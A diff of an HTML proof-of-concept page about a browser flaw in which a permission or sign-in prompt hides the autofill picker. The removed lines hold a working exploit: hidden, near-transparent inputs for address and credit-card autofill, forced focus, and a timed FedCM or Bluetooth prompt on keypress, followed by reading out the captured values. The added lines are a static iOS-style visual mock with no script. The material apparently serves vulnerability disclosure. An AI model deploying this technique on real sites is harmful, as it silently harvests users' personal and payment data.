@@ -1,142 +1,157 @@
-
 <!doctype html>
-<html>
+<html lang="en">
 <head>
-<body onclick="start()" value="Click here!" type="button" />
-<p id="output">(no output yet...)</p>
+<meta charset="utf-8">
+<title>Mock iOS Autofill Obscured PoC</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
 
 <style>
-html { font-family: sans-serif; }
-#instructions { text-align: center; margin-top: 200px; font-size: 2em; user-select: none; }
+/* ====== iOS-ish base ====== */
+html, body {
+  margin: 0;
+  padding: 0;
+  height: 100%;
+  font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", sans-serif;
+  background: #f2f2f7;
+}
 
-input { position: absolute; top: 0; left: -200px; opacity: 0.0001; }
-#inputElem { position: absolute; top: 30px; left: auto; left: 250px; }
-#inputElem.debug { opacity: 0.5; }
+.phone {
+  width: 390px;   /* iPhone 14 width */
+  height: 844px;  /* iPhone 14 height */
+  margin: 20px auto;
+  background: white;
+  border-radius: 28px;
+  box-shadow: 0 20px 60px rgba(0,0,0,.35);
+  overflow: hidden;
+  position: relative;
+}
 
-#output { padding: 0.2em; background: #eee; }
-#output.success { background: lightgreen; }
+/* ====== Safari URL bar ====== */
+.safari-bar {
+  height: 54px;
+  background: #f7f7f7;
+  border-bottom: 1px solid #ddd;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 14px;
+  color: #555;
+}
+
+/* ====== Page content ====== */
+.content {
+  padding: 40px 20px;
+}
+
+label {
+  display: block;
+  margin-bottom: 6px;
+  color: #333;
+}
+
+input {
+  width: 100%;
+  font-size: 17px;
+  padding: 14px;
+  border-radius: 10px;
+  border: 1px solid #ccc;
+}
+
+/* ====== iOS Autofill bar ====== */
+.autofill {
+  position: absolute;
+  bottom: 0;
+  left: 0;
+  right: 0;
+  height: 72px;
+  background: #f9f9f9;
+  border-top: 1px solid #ccc;
+  display: flex;
+  align-items: center;
+  padding: 0 12px;
+  gap: 10px;
+  z-index: 10;
+}
+
+.autofill-pill {
+  background: white;
+  border-radius: 16px;
+  padding: 10px 14px;
+  box-shadow: 0 1px 3px rgba(0,0,0,.15);
+  font-size: 14px;
+}
+
+/* ====== iOS permission sheet ====== */
+.permission {
+  position: absolute;
+  bottom: 0;
+  left: 0;
+  right: 0;
+  height: 340px;
+  background: #fff;
+  border-radius: 18px 18px 0 0;
+  box-shadow: 0 -10px 30px rgba(0,0,0,.3);
+  z-index: 20; /* covers autofill */
+  padding: 20px;
+}
+
+.permission h3 {
+  text-align: center;
+  margin-top: 10px;
+  font-weight: 600;
+}
+
+.permission p {
+  text-align: center;
+  color: #666;
+  font-size: 14px;
+}
+
+.permission button {
+  width: 100%;
+  margin-top: 12px;
+  padding: 14px;
+  border-radius: 12px;
+  border: none;
+  font-size: 16px;
+}
+
+.allow {
+  background: #007aff;
+  color: white;
+}
+
+.deny {
+  background: #eee;
+}
 </style>
 </head>
+
 <body>
-<h1>PoC: Autofill obscured by FedCM prompt</h1>
-<p>Variations:</p>
-<ul>
-</ul>
+<div class="phone">
 
-<!-- Group 1 -->
-<input id="groupOneElem" name="name" autocomplete="name">
-<input name="email" autocomplete="email">
-<input name="address-line1" autocomplete="address-line1">
-<input name="address-line2" autocomplete="address-line2">
-<input name="city" autocomplete="address-level2">
-<input name="state" autocomplete="address-level1">
-<input name="country-name" autocomplete="country-name">
-<input name="postal-code" autocomplete="postal-code">
-<input name="tel" autocomplete="tel">
+  <div class="safari-bar">example.com</div>
 
-<!-- Group 2 -->
-<input id="groupTwoElem" name="cc-name" autocomplete="cc-name">
-<input name="cc-number" autocomplete="cc-number">
-<input name="cc-exp-month" autocomplete="cc-exp-month">
-<input name="cc-exp-year" autocomplete="cc-exp-year">
+  <div class="content">
+    <label>Name</label>
+    <input placeholder="Tap to autofill" autofocus>
+  </div>
 
-<p id="instructions">Press down arrow key, then press enter</p>
-<script>
+  <!-- Autofill bar (hidden underneath permission) -->
+  <div class="autofill">
+    <div class="autofill-pill">John Appleseed</div>
+    <div class="autofill-pill">john@icloud.com</div>
+  </div>
 
-function start(){
+  <!-- Permission sheet -->
+  <div class="permission">
+    <h3>“example.com” Wants to Use Bluetooth</h3>
+    <p>This allows the website to connect to nearby devices.</p>
 
+    <button class="allow">Allow</button>
+    <button class="deny">Don’t Allow</button>
+  </div>
 
-navigator.bluetooth.requestDevice({acceptAllDevices:true});
-setTimeout("navigator.bluetooth.requestDevice({acceptAllDevices:true})", 20)
-}
-var searchParams = new URLSearchParams(window.location.search);
-var mode = searchParams.get('mode');
-var autofill = searchParams.get('autofill');
-var idpPort = searchParams.get('idpport');
-if (!idpPort) {
-    idpPort = 8088;
-}
-
-var inputElem;
-var debugMode = searchParams.get('debug') === '1';
-var setMainField = () => {
-  if (autofill == 'creditcard') {
-    var groupTwoElem = document.getElementById('groupTwoElem');
-    groupTwoElem.id = 'inputElem';
-    inputElem = groupTwoElem;
-  } else {
-    var groupOneElem = document.getElementById('groupOneElem');
-    groupOneElem.id = 'inputElem';
-    inputElem = groupOneElem;
-  }
-  if (debugMode) {
-    inputElem.classList.add('debug');
-  }
-}
-
-setMainField();
-
-var updateOutput = () => {
-    var inputs = document.querySelectorAll('input');
-    var inputValues = [];
-    inputs.forEach((elem) => {
-       if (elem.value.length) {
-         inputValues.push(elem.value);
-       }
-    });
-    output.innerText = inputValues.join(', ');
-    output.classList.add('success');
-    instructions.innerText = 'Thank you!';
-    abortController.abort();
-}
-
-inputElem.addEventListener('change', (e) => {
-  if (inputElem.value.length > 0) {
-    setTimeout(() => { updateOutput(); }, 10);
-  }
-});
-
-var ran = false;
-var abortController = new AbortController();
-
-var login = async () => {
-    var creds = await navigator.credentials.get({
-        signal: abortController.signal,
-        mediation: 'required',
-        identity: {
-            context: 'continue', // 'continue', 'signin', 'signup', 'use'
-            providers: [{
-                configURL: 'http://localhost:'+idpPort+'/config.json',
-                clientId: '123',
-                nonce: '456'
-            }]
-        }
-    });
-}
-
-if (mode == 'three') {
-    instructions.innerText = 'Press down arrow key twice, then press enter';
-} else {
-    instructions.innerText = 'Press down arrow key, then press enter';
-    setInterval(() => {
-        inputElem.focus();
-    }, 100);
-}
-
-window.addEventListener('keydown', () => {
-    if (ran) { return; }
-    ran = true;
-    if (mode == 'three') {
-	
-        setTimeout(() => {
-            // Show autofill prompt on delay to minimize time visible to user.
-            // However, autofill prompt should not be shown after FedCM prompt,
-            // otherwise autofill prompt will be above FedCM prompt.
-            inputElem.showPicker();
-        }, 140);
-    }
-    login();
-});
-</script>
+</div>
 </body>
 </html>
